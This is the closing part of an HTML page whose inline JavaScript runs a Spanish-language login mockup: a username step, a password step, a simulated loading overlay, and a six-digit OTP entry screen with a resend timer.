      <button class="otp-resend" type="button" id="btnResend" disabled>Reenviar código</button>
    </div>
  </div>
</div>

<script>
  (function () {
    const step1 = document.getElementById('step1');
    const step2 = document.getElementById('step2');
    const usuario = document.getElementById('usuario');
    const password = document.getElementById('password');
    const userLabel = document.getElementById('userLabel');
    const btnSig = document.getElementById('btnSiguiente');
    const btnIng = document.getElementById('btnIngresar');
    const btnCambiar = document.getElementById('btnCambiar');
    const togglePwd = document.getElementById('togglePwd');
    const overlay = document.getElementById('loadingOverlay');

    function goToStep2() {
      const v = usuario.value.trim();
      if (!v) { usuario.focus(); return; }
      userLabel.textContent = v;
      step1.classList.add('hidden');
      step2.classList.add('active');
      setTimeout(() => password.focus(), 50);
    }
    function goToStep1() {
      step2.classList.remove('active');
      step1.classList.remove('hidden');
      password.value = '';
      usuario.focus();
    }
    function doLogin() {
      if (!password.value) { password.focus(); return; }
      overlay.classList.add('active');
      setTimeout(() => {
        overlay.classList.remove('active');
        showOtp();
      }, 2200);
    }

    // ── OTP screen ──
    const otpScreen = document.getElementById('otpScreen');
    const otpInputs = document.querySelectorAll('#otpInputs input');
    const btnValidar = document.getElementById('btnValidar');
    const btnResend = document.getElementById('btnResend');
    const otpTimer = document.getElementById('otpTimer');
    let timerInterval;

    function showOtp() {
      otpScreen.classList.add('active');
      otpInputs.forEach(i => { i.value = ''; i.classList.remove('filled'); });
      btnValidar.disabled = true;
      startTimer(120);
      setTimeout(() => otpInputs[0].focus(), 100);
    }

    function startTimer(seconds) {
      clearInterval(timerInterval);
      btnResend.disabled = true;
      let s = seconds;
      const tick = () => {
        const m = String(Math.floor(s / 60)).padStart(2, '0');
        const ss = String(s % 60).padStart(2, '0');
        otpTimer.textContent = `${m}:${ss}`;
        if (s <= 0) {
          clearInterval(timerInterval);
          btnResend.disabled = false;
          otpTimer.textContent = '00:00';
        }
        s--;
      };
      tick();
      timerInterval = setInterval(tick, 1000);
    }

    otpInputs.forEach((input, idx) => {
      input.addEventListener('input', (e) => {
        const v = e.target.value.replace(/\D/g, '');
        e.target.value = v;
        if (v) {
          e.target.classList.add('filled');
          if (idx < otpInputs.length - 1) otpInputs[idx + 1].focus();
        } else {
          e.target.classList.remove('filled');
        }
        const allFilled = Array.from(otpInputs).every(i => i.value);
        btnValidar.disabled = !allFilled;
      });
      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !input.value && idx > 0) {
          otpInputs[idx - 1].focus();
        }
      });
      input.addEventListener('paste', (e) => {
        e.preventDefault();
        const data = (e.clipboardData.getData('text') || '').replace(/\D/g, '');
        data.split('').slice(0, otpInputs.length).forEach((ch, i) => {
          otpInputs[i].value = ch;
          otpInputs[i].classList.add('filled');
        });
        const nextEmpty = Array.from(otpInputs).findIndex(i => !i.value);
        (nextEmpty >= 0 ? otpInputs[nextEmpty] : otpInputs[otpInputs.length - 1]).focus();
        btnValidar.disabled = !Array.from(otpInputs).every(i => i.value);
      });
    });

    btnValidar.addEventListener('click', () => {
      otpScreen.classList.remove('active');
      overlay.classList.add('active');
    });

    btnResend.addEventListener('click', () => {
      otpInputs.forEach(i => { i.value = ''; i.classList.remove('filled'); });
      btnValidar.disabled = true;
      otpInputs[0].focus();
      startTimer(120);
    });

    btnSig.addEventListener('click', goToStep2);
    usuario.addEventListener('keydown', e => { if (e.key === 'Enter') goToStep2(); });
    btnCambiar.addEventListener('click', goToStep1);
    btnIng.addEventListener('click', doLogin);
    password.addEventListener('keydown', e => { if (e.key === 'Enter') doLogin(); });

    togglePwd.addEventListener('click', () => {
      password.type = password.type === 'password' ? 'text' : 'password';
    });
  })();
</script>


</body>
</html>
